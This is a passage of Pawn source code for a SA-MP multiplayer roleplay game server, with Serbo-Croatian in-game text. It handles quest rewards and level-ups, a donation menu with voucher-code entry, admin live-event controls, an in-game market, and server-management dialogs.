					{
						sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
					}
				}
				case 6:
				{
					if(questInfo[playerid][qt_EasyQuest][6] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][6] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][6] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.7");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata ~w~& ~p~4x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 50;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);

		            PlayerInfo[ playerid ][ xRespekt ] += 4;
		            
		            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
					if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
					{
						format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
						GameTextForPlayer( playerid, globalstring, 5000, 1);
						PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic( playerid );
						PlayerInfo[ playerid ][ xLevel ]++;
						SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
						PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
			            PlayerInfo[ playerid ][ xRespekt ] = 0;
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

	                    new q[ 120 ];
						mysql_format( mSQL, q, sizeof(q),
							"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
								PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );

						if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) 
						{
						    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) 
						    {
								PlayerInfo[ playerid ][ xSlotoviVozila ]++;
								SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

								sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
							}
						}
					}
					else
					{
						sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
					}
				}
				case 7:
				{
					if(questInfo[playerid][qt_EasyQuest][7] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][7] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][7] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.8");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata ~w~& ~p~4x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 50;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);

		            PlayerInfo[ playerid ][ xRespekt ] += 4;
		            
		            new nxtlevel = PlayerInfo[ playerid ][ xLevel ]+1, expamount = nxtlevel*levelexp;
					if( PlayerInfo[ playerid ][ xRespekt ] >= expamount )
					{
						format( globalstring, sizeof( globalstring ), "~g~LEVEL UP~n~~w~Sada si Level %d", nxtlevel );
						GameTextForPlayer( playerid, globalstring, 5000, 1);
						PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
						PlayerPlayMusic( playerid );
						PlayerInfo[ playerid ][ xLevel ]++;
						SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
						PlayerInfo[ playerid ][ xPoboljsanja ] += 2;
			            PlayerInfo[ playerid ][ xRespekt ] = 0;
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Sada si level {FFFFFF}(%d) {33CCFF}kucaj {FFFFFF}[ /upgrade ] {33CCFF}za neke bonuse.", nxtlevel );
						SCMF( playerid, 0x33CCFFFF, "(LEVELUP): Imas {FFFFFF}(%d) {33CCFF}neiskoristenih upgrade poena.", PlayerInfo[ playerid ][ xPoboljsanja ]);

	                    new q[ 120 ];
						mysql_format( mSQL, q, sizeof(q),
							"UPDATE `users` SET `level` = '%d', `exp` = '%d', `upgrades` = '%d' WHERE `user_id` = '%d' LIMIT 1",
								PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xRespekt ], PlayerInfo[ playerid ][ xPoboljsanja ], PlayerInfo[ playerid ][ xID ] );
						mysql_tquery( mSQL, q );

						if( PlayerInfo[ playerid ][ xLevel ] == 5 || PlayerInfo[ playerid ][ xLevel ] == 10 ) 
						{
						    if( PlayerInfo[ playerid ][ xSlotoviVozila ] < MAX_VEH_SLOT ) 
						    {
								PlayerInfo[ playerid ][ xSlotoviVozila ]++;
								SCMF( playerid, ZUTA, "(VOZILO): Dobili ste dodatni slot vozila jer ste presli level {FFFFFF}(%d). {FFFF00}Sada imate {FFFFFF}(%d).", PlayerInfo[ playerid ][ xLevel ], PlayerInfo[ playerid ][ xSlotoviVozila ] );

								sql_user_update_integer( playerid, "vehicle_slots", PlayerInfo[ playerid ][ xSlotoviVozila ] );
							}
						}
					}
					else
					{
						sql_user_update_integer( playerid, "exp", PlayerInfo[ playerid ][ xRespekt ] );
					}
				}
				case 8:
				{
					if(questInfo[playerid][qt_EasyQuest][8] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][8] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][8] = true;

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.9");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata ~w~& ~p~4x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 10;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);
				}
				case 9:
				{
					if(questInfo[playerid][qt_EasyQuest][9] == false) return SendErrorMessage(playerid, "Niste rijesili zadatak.");
					if(questInfo[playerid][qt_EasyRewardQuest][9] == true) return SendErrorMessage(playerid, "Vec ste pokupili nagradu za ovaj zadatak.");

					questInfo[playerid][qt_EasyRewardQuest][9] = true;					

					KillTimer(QuestTimer[playerid]);
					quest_CreateTDs(playerid, false);

					quest_CreateTDs(playerid, true);
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "PREUZELI STE NAGRADU ~p~ZADATAK BR.10");
					PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "NAGRADA: ~p~15g zlata ~w~& ~p~4x respekt");
					QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 2);

					PlayerInfo[ playerid ][ xZlato ] += 100;
				   	sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
					sql_UpdateQuest(playerid);

		            PlayerInfo[ playerid ][ xLevel ] += 1;
		            SetPlayerScore( playerid, PlayerInfo[ playerid ][ xLevel ] );
		            sql_user_update_integer( playerid, "level", PlayerInfo[ playerid ][ xLevel ] );
				}
			}
		}
	}
	else if(dialogid == dialog_DONATE )
	{
	    if( !response ) return 1;
    	if( response )
		{
			switch(listitem) 
			{
				case 0:
				{
				    ShowPlayerDialog(playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																"#\tStvar\tCijena\n\
																{4282C0}(1).\t{FFFFFF}10 U-Poena\t1 EURO\n\
																{4282C0}(2).\t{FFFFFF}VIP 1\t15 UP\n\
																{4282C0}(3).\t{FFFFFF}VIP 2\t20 UP\n\
																{4282C0}(4).\t{FFFFFF}VIP 3\t25 UP\n\
																{4282C0}(5).\t{FFFFFF}VIP 4\t30 UP\n\
																{4282C0}(6).\t{FFFFFF}VIP 5\t35 UP\n\
																{4282C0}(7).\t{FFFFFF}VIP 6\t40 UP\n\
																{4282C0}(8).\t{FFFFFF}Specijalno ime\t70 UP\n\
																{4282C0}(9).\t{FFFFFF}Donatorske kuce (do 100 objakata)\t50 UP\n\
																{4282C0}(10).\t{FFFFFF}Mapana Villa\t100 UP\n\
																{4282C0}(11).\t{FFFFFF}Donatorske boje\t30 UP\n\
																{4282C0}(12).\t{FFFFFF}Dodatni slot vozila\t20 UP\n\
																{4282C0}(13).\t{FFFFFF}Donatorska organizacija\t60 UP (mjesecno)", "OK", "");
				}

				case 1: ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, "{4282C0}PayPal: {FFFFFF}kristijanpejakovic9@gmail.com", "OK", "" );
				case 2:
				{
					if(PlayerInfo[playerid][xBonPotvrda] > 0) return SendErrorMessage(playerid, "Vec imate aktivan zahtjev za pregled Xbona"); 
					ShowPlayerDialog( playerid, dialog_XBON, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas Xbon kod.\nPrimer: 1234 1234 123 123", "Posalji", "Odustani" );
				}
				case 3:
				{
					if(PlayerInfo[playerid][xPaysPotvrda] > 0) return SendErrorMessage(playerid, "Vec imate aktivan zahtjev za pregled PaySafe"); 
					ShowPlayerDialog( playerid, dialog_PAYSAFE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas PaySafe kod.\nPrimer: 1234 1234 1234 1234", "Posalji", "Odustani" );
				}
				case 4: ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, "{4282C0}Posetite forum za daljnje informacije:\n\n"SERVER_WEB"", "OK", "" );
			}
		}
	}
	else if(dialogid == dialog_XBON )
	{
		if( !response ) return 1;
		if( response )
		{
			if(PlayerInfo[playerid][xBonPotvrda] > 0) return SendErrorMessage(playerid, "Vec imate aktivan zahtjev za pregled Xbona"); 
		    new kod1, kod2, kod3, kod4;
            if( sscanf( inputtext, "iiii", kod1, kod2, kod3, kod4) ) return ShowPlayerDialog( playerid, dialog_XBON, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas Xbon kod.\nPrimer: 1234 5678 998 765", "Posalji", "Odustani" );
            if( strlen(inputtext) < 17 || strlen(inputtext) > 17 ) return ShowPlayerDialog( playerid, dialog_XBON, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas Xbon kod.\nPrimer: 1234 5678 998 765", "Posalji", "Odustani" );

            new brojpotvrde = ( 400000+random( 500000 ) );
            PlayerInfo[ playerid ][ xBonPotvrda ] = brojpotvrde;
			sql_user_update_integer( playerid, "xBonPotvrda", PlayerInfo[ playerid ][ xBonPotvrda ] );
			SendInfoMessage( playerid, "Vas broj XBon potvrde je {FFFFFF}%d.", brojpotvrde );
			SendInfoMessage( playerid, "Broj vase potvrde mozete vidjeti u bilo kojem trenu komandom /brojpotvrde");

			WriteLog("log-xbon-kodovi", "%s xbon kod: %d %d %d %d, BROJ POTVRDE: %d", ImeIgraca( playerid ), kod1, kod2, kod3, kod4, brojpotvrde);
		}
	}
	else if(dialogid == dialog_PAYSAFE )
	{
		if( !response ) return 1;
		if( response )
		{
			if(PlayerInfo[playerid][xPaysPotvrda] > 0) return SendErrorMessage(playerid, "Vec imate aktivan zahtjev za pregled PaySafea"); 
		    new kod1, kod2, kod3, kod4;
            if( sscanf( inputtext, "iiii", kod1, kod2, kod3, kod4) ) return ShowPlayerDialog( playerid, dialog_PAYSAFE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas Paysafe kod.\nPrimer: 1234 1234 1234 1234", "Posalji", "Odustani" );
            if( strlen(inputtext) < 19 || strlen(inputtext) > 19 ) return ShowPlayerDialog( playerid, dialog_PAYSAFE, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite u prazno vas Paysafe kod.\nPrimer: 1234 1234 1234 1234", "Posalji", "Odustani" );

            new brojpotvrde = ( 400000+random( 500000 ) );
            PlayerInfo[ playerid ][ xPaysPotvrda ] = brojpotvrde;
			sql_user_update_integer( playerid, "xPaysPotvrda", PlayerInfo[ playerid ][ xPaysPotvrda ] );
			SendInfoMessage( playerid, "Vas broj Paysafe potvrde je {FFFFFF}%d.", brojpotvrde );
			SendInfoMessage( playerid, "Broj vase potvrde mozete vidjeti u bilo kojem trenu komandom /brojpotvrde");

			WriteLog("log-paysafe-kodovi", "%s paysafe kod: %d %d %d %d, BROJ POTVRDE: %d", ImeIgraca( playerid ), kod1, kod2, kod3, kod4, brojpotvrde);
		}
	}
	else if(dialogid == dialog_LIVEEVENT )
	{
	    if( !response ) return 1;
    	if( response )
		{
			switch(listitem) 
			{
				case 0: ShowPlayerDialog( playerid, dialog_LIVEGUNS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id guna i kolicinu municije.\nPrimer: 24 12", "Odaberi", "Odustani" );
				case 1:
				{
					foreach(new i : Player) 
		    		{
		    			if(PlayerInvited[ i ] == event_LIVE)
		    			{
		    				if( IsPlayerConnected( i ) && i != IPI )
							{
								if(PlayerInfo[ i ][ xAdmin ] < 1)
								{
		    						SMG_TogglePlayerControllable( i, false );
		    						SendInfoMessage( i, "Admin {FFFFFF}%s {4282C0}te je zaledio.", ImeIgraca( playerid ));
		    					}
		    				}
		    			}
		    		}
					DodajWarnRed("~y~(LIVE-FREEZE) %s ~w~je zaledio sve igrace na live eventu.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				}
				case 2:
				{
					foreach(new i : Player) 
		    		{
		    			if(PlayerInvited[ i ] == event_LIVE)
		    			{
		    				if( IsPlayerConnected( i ) && i != IPI )
							{
								if(PlayerInfo[ i ][ xAdmin ] < 1)
								{
			    					SMG_TogglePlayerControllable( i, true );
			    					SendInfoMessage( i, "Admin {FFFFFF}%s {4282C0}te je odledio.", ImeIgraca( playerid ));
			    				}
		    				}
		    			}
		    		}
					DodajWarnRed("~y~(LIVE-UNFREEZE) %s ~w~je odledio sve igrace na live eventu.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				}
				case 3:
				{
					foreach(new i : Player) 
		    		{
		    			if(PlayerInvited[ i ] == event_LIVE)
		    			{
		    				if( IsPlayerConnected( i ) && i != IPI )
							{
								if(PlayerInfo[ i ][ xAdmin ] < 1)
								{
			    					SetPlayerArmour( i, 99);
			    					SendInfoMessage( i, "Admin {FFFFFF}%s {4282C0}ti je setovao armour na 99.", ImeIgraca( playerid ));
			    				}
		    				}
		    			}
		    		}
					DodajWarnRed("~y~(LIVE-ARMOUR) %s ~w~je dao svim igracima na live eventu armor.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				}
				case 4:
				{
					foreach(new i : Player) 
		    		{
		    			if(PlayerInvited[ i ] == event_LIVE)
		    			{
		    				if( IsPlayerConnected( i ) && i != IPI )
							{
								if(PlayerInfo[ i ][ xAdmin ] < 1)
								{
			    					SetPlayerHealth( i, 99);
			    					SendInfoMessage( i, "Admin {FFFFFF}%s {4282C0}ti je setovao health na 99.", ImeIgraca( playerid ));
			    				}
		    				}
		    			}
		    		}
					DodajWarnRed("~y~(LIVE-HP) %s ~w~je dao svim igracima na live eventu health.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				}
			}
		}
	}
	else if(dialogid == dialog_LIVEGUNS )
	{
		if( !response ) return 1;
		if( response )
		{
			if( PlayerInfo[ playerid ][ xAdmin ] < 1 ) return SendErrorMessage(playerid, "Niste ovlasceni.");
			new gun, ammo;
			if( sscanf( inputtext, "ii", gun, ammo ) ) return ShowPlayerDialog( playerid, dialog_LIVEGUNS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id guna i kolicinu municije.\nPrimer: 24 12", "Odaberi", "Odustani" );
			if( gun < 1 || gun > 46 ) return ShowPlayerDialog( playerid, dialog_LIVEGUNS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id guna i kolicinu municije.\nPrimer: 24 12", "Odaberi", "Odustani" );
			if( ammo < 1 || ammo > 999 ) return ShowPlayerDialog( playerid, dialog_LIVEGUNS, DIALOG_STYLE_INPUT, D_NASLOV, "{FFFFFF}* Unesite id guna i kolicinu municije.\nPrimer: 24 12", "Odaberi", "Odustani" );
			
			foreach(new i : Player) 
    		{
    			if(PlayerInvited[ i ] == event_LIVE)
    			{
    				if( IsPlayerConnected( i ) && i != IPI )
					{
    					GiveWeaponToPlayer( i, gun, ammo );
    					SendInfoMessage( i, "Admin {FFFFFF}%s {4282C0}ti je dao oruzje {FFFFFF}%s.", ImeIgraca( playerid ), WeaponInfos[ gun ][ wName ] );
    				}
    			}
    		}
    	}
	}
	else if(dialogid == dialog_MARKETBUY )
	{
	    if( !response ) return 1;
    	if( response )
		{
		    if( PlayerInfo[ playerid ][ xNovac ] < UkupnaCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca." );
		    UkupnaCena[ playerid ] = 0;

		    SendNearbyMessage(playerid, 15.0, 0xC2A2DAFF, "* %s placa kasirki, te uzima stvari iz korpe.", ImeIgraca( playerid ) );

			if( UzeoIzMarketa[ playerid ][ 0 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xTorba_Pizza]+UzeoIzMarketa[ playerid ][ 0 ]) <= 500 )
				{
					new pizza = UzeoIzMarketa[ playerid ][ 0 ];
					if(pizza < 0 || pizza > 500) pizza = 500, SendInfoMessage(playerid, "Ne mozete kupiti vise od 500 pizza, zato vam je broj pizza postavljen na 500.");
					DajIgracuNovac( playerid, -pizza*100 );
					PlayerInfo[playerid][xTorba_Pizza] += pizza;
					sql_user_update_integer(playerid, "xTorba_Pizza", PlayerInfo[playerid][xTorba_Pizza]);
				    UzeoIzMarketa[ playerid ][ 0 ] = 0;
					BussinesMoney( uFirmi[ playerid ], pizza*100, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite pizze." );
			}
		    if( UzeoIzMarketa[ playerid ][ 1 ] == 1 )
			{
		        DajIgracuNovac( playerid, -200 );
		        Uze[ playerid ] = true;
		        UzeoIzMarketa[ playerid ][ 1 ] = 0;
		        BussinesMoney( uFirmi[ playerid ], 200, true );
			}
		    if( UzeoIzMarketa[ playerid ][ 2 ] == 1 )
			{
		        SendErrorMessage(playerid, "Ne koristi se.");
			}
		    if( UzeoIzMarketa[ playerid ][ 3 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xTorba_Sok]+UzeoIzMarketa[ playerid ][ 3 ]) <= 500 )
				{
					new Sok = UzeoIzMarketa[ playerid ][ 3 ];
					if(Sok < 0 || Sok > 500) Sok = 500, SendInfoMessage(playerid, "Ne mozete kupiti vise od 500 sokova, zato vam je broj sokova postavljen na 500.");
					DajIgracuNovac( playerid, -Sok*40 );
					PlayerInfo[playerid][xTorba_Sok] += Sok;
					sql_user_update_integer(playerid, "xTorba_Sok", PlayerInfo[playerid][xTorba_Sok]);
				    UzeoIzMarketa[ playerid ][ 3 ] = 0;
					BussinesMoney( uFirmi[ playerid ], Sok*40, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite sokove." );

			}
		    if( UzeoIzMarketa[ playerid ][ 4 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xTorba_Pivo]+UzeoIzMarketa[ playerid ][ 4 ]) <= 500 )
				{
					new Pivo = UzeoIzMarketa[ playerid ][ 4 ];
					if(Pivo < 0 || Pivo > 500) Pivo = 500, SendInfoMessage(playerid, "Ne mozete kupiti vise od 500 piva, zato vam je broj piva postavljen na 500.");
					DajIgracuNovac( playerid, -Pivo*55 );
					PlayerInfo[playerid][xTorba_Pivo] += Pivo;
					sql_user_update_integer(playerid, "xTorba_Pivo", PlayerInfo[playerid][xTorba_Pivo]);
				    UzeoIzMarketa[ playerid ][ 4 ] = 0;
					BussinesMoney( uFirmi[ playerid ], Pivo*55, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite pivo." );

			}
		    if( UzeoIzMarketa[ playerid ][ 5 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xTorba_Hambi]+UzeoIzMarketa[ playerid ][ 5 ]) <= 500 )
				{
					new hamburger = UzeoIzMarketa[ playerid ][ 5 ];
					if(hamburger < 0 || hamburger > 500) hamburger = 500, SendInfoMessage(playerid, "Ne mozete kupiti vise od 500 hambia, zato vam je broj hamburgera postavljen na 500.");
					DajIgracuNovac( playerid, -hamburger*65 );
					PlayerInfo[playerid][xTorba_Hambi] += hamburger;
					sql_user_update_integer(playerid, "xTorba_Hambi", PlayerInfo[playerid][xTorba_Hambi]);
				    UzeoIzMarketa[ playerid ][ 5 ] = 0;
					BussinesMoney( uFirmi[ playerid ], hamburger*65, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite hamburgere." );
			}
		    if( UzeoIzMarketa[ playerid ][ 6 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xTorba_Riba]+UzeoIzMarketa[ playerid ][ 5 ]) <= 500 )
				{
					new pilence = UzeoIzMarketa[ playerid ][ 6 ];
					if(pilence < 0 || pilence > 500) pilence = 500, SendInfoMessage(playerid, "Ne mozete kupiti vise od 500 ribe, zato vam je broj ribe postavljen na 500.");
					DajIgracuNovac( playerid, -pilence*250 );
					PlayerInfo[playerid][xTorba_Riba] += pilence;
					sql_user_update_integer(playerid, "xTorba_Riba", PlayerInfo[playerid][xTorba_Riba]);
				    UzeoIzMarketa[ playerid ][ 6 ] = 0;
					BussinesMoney( uFirmi[ playerid ], pilence*250, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite ribu." );
			}
			if( UzeoIzMarketa[ playerid ][ 7 ] == 1 )
			{
			    DajIgracuNovac( playerid, -35 );
			    PlayerInfo[ playerid ][ xCigare ] += 20;
		        UzeoIzMarketa[ playerid ][ 7 ] = 0;
		        BussinesMoney( uFirmi[ playerid ], 35, true);
			}
			if( UzeoIzMarketa[ playerid ][ 8 ] == 1 )
			{
			    DajIgracuNovac( playerid, -25 );
			    PlayerInfo[ playerid ][ xUpaljac ] = 1;
		        UzeoIzMarketa[ playerid ][ 8 ] = 0;
		        BussinesMoney( uFirmi[ playerid ], 25, true);
			}
		    if( UzeoIzMarketa[ playerid ][ 9 ] >= 1 )
			{
				if( (PlayerInfo[playerid][xFirework]+UzeoIzMarketa[ playerid ][ 9 ]) <= 10 )
				{
					new vatromet = UzeoIzMarketa[ playerid ][ 9 ];
					if(vatromet < 0 || vatromet > 10) vatromet = 10, SendInfoMessage(playerid, "Ne mozete kupiti vise od 10 vatrometa, zato vam je broj vatrometa postavljen na 10.");
					DajIgracuNovac( playerid, -vatromet*3500 );
					PlayerInfo[playerid][xFirework] += vatromet;
					sql_user_update_integer(playerid, "xFirework", PlayerInfo[playerid][xFirework]);
				    UzeoIzMarketa[ playerid ][ 9 ] = 0;
					BussinesMoney( uFirmi[ playerid ], vatromet*2500, true);
				}
				else SendErrorMessage( playerid, "Nemate mesta da stavite vatromet." );
			}
		}
	}
	else if(dialogid == dialog_SERVERMI )
	{
	    if( !response ) return 1;
        if( response )
		{
		    switch(listitem)
		    {
	        	case 0:
				{
	        	    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
	                if(!IsSpecialUser(playerid)) return SendErrorMessage(playerid, "Samo specijalni korisnici mogu koristiti ovu komandu.");

	                ShowPlayerDialog(playerid, dialog_SERVERSTATS, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																											"#\tOpcija\n\
																											{4282C0}(1).\t{FFFFFF}Informacije servera\n\
																											{4282C0}(2).\t{FFFFFF}Mogucnost kupovine vozila\n\
																											{4282C0}(3).\t{FFFFFF}Srecni sati\n\
																											{4282C0}(4).\t{FFFFFF}Srecni poslovi\n\
																											{4282C0}(5).\t{FFFFFF}Mogucnost slanja pitanja\n\
																											{4282C0}(6).\t{FFFFFF}Mogucnost slanja reporta\n\
																											{4282C0}(7).\t{FFFFFF}Promeni pocetni level\n\
																											{4282C0}(8).\t{FFFFFF}Promeni pocetni novac\n\
																											{4282C0}(9).\t{FFFFFF}Mogucnost postavljanja oglasa\n\
																											{4282C0}(10).\t{FFFFFF}Mogucnost registracije", "Odaberi", "Nazad");
	            }
				case 1:
				{
				    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
	                if(!IsSpecialUser(playerid)) return SendErrorMessage(playerid, "Samo specijalni korisnici mogu koristiti ovu komandu.");

					ShowPlayerDialog( playerid, dialog_NAPRAVISVE, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																											"#\tOpcija\n\
																											{4282C0}(1).\t{FFFFFF}Organizacije\n\
																											{4282C0}(2).\t{FFFFFF}Vozila\n\
																											{4282C0}(3).\t{FFFFFF}Firmu\n\
																											{4282C0}(4).\t{FFFFFF}Kontejner\n\
																											{4282C0}(5).\t{FFFFFF}Kuca\n\
																											{4282C0}(6).\t{FFFFFF}Stan\n\
																											{4282C0}(7).\t{FFFFFF}Vikendica\n\
																											{4282C0}(8).\t{FFFFFF}Tiki\n\
																											{4282C0}(9).\t{FFFFFF}Bankomat\n\
																											{4282C0}(10).\t{FFFFFF}((empty))\n\
																											{4282C0}(11).\t{FFFFFF}Kapija\n\
																											{4282C0}(12).\t{FFFFFF}((empty))\n\
																											{4282C0}(13).\t{FFFFFF}((empty))\n\
																											{4282C0}(14).\t{FFFFFF}GPS Lokacija\n\
																											{4282C0}(15).\t{FFFFFF}Gang Zona\n\
																											{4282C0}(16).\t{FFFFFF}Poklon\n\
																											{4282C0}(17).\t{FFFFFF}Jelka\n\
																											{4282C0}(18).\t{FFFFFF}Rent", "Odaberi", "Nazad");
				}
				case 2:
				{
				    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
	                if(!IsSpecialUser(playerid)) return SendErrorMessage(playerid, "Samo specijalni korisnici mogu koristiti ovu komandu.");

					ShowPlayerDialog( playerid, dialog_IZBRISISVE, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																											"#\tOpcija\n\
																											{4282C0}(1).\t{FFFFFF}Organizacije\n\
																											{4282C0}(2).\t{FFFFFF}Firme\n\
																											{4282C0}(3).\t{FFFFFF}Imovina\n\
																											{4282C0}(4).\t{FFFFFF}Kontejner\n\
																											{4282C0}(5).\t{FFFFFF}Vozilo\n\
																											{4282C0}(6).\t{FFFFFF}Bankomat\n\
																											{4282C0}(7).\t{FFFFFF}((empty))\n\
																											{4282C0}(8).\t{FFFFFF}Kapija\n\
																											{4282C0}(9).\t{FFFFFF}((empty))\n\
																											{4282C0}(10).\t{FFFFFF}Gang Zona\n\
																											{4282C0}(11).\t{FFFFFF}Poklon\n\
																											{4282C0}(12).\t{FFFFFF}Jelka\n\
																											{4282C0}(13).\t{FFFFFF}Rent", "Odaberi", "Nazad");
				}
				case 3:
				{
	       			if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu sekciju.");
	                if(!IsSpecialUser(playerid)) return SendErrorMessage(playerid, "Samo specijalni korisnici mogu koristiti ovu komandu.");

	                ShowPlayerDialog( playerid, dialog_IZMENISVE, DIALOG_STYLE_TABLIST_HEADERS, D_NASLOV,
																											"#\tOpcija\n\
																											{4282C0}(1).\t{FFFFFF}Organizacije\n\
																											{4282C0}(2).\t{FFFFFF}Firme\n\
																											{4282C0}(3).\t{FFFFFF}Vozilo\n\
																											{4282C0}(4).\t{FFFFFF}Imovina\n\
																											{4282C0}(5).\t{FFFFFF}((empty))\n\
																											{4282C0}(6).\t{FFFFFF}((empty))\n\
																											{4282C0}(7).\t{FFFFFF}GPS Lokacija\n\
																											{4282C0}(8).\t{FFFFFF}((empty))\n\
																											{4282C0}(9).\t{FFFFFF}Gang Zona", "Odaberi", "Nazad" );
				}
				case 4:
				{
				    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					for( new i = 1; i < MAX_ORG; i++ )
					{
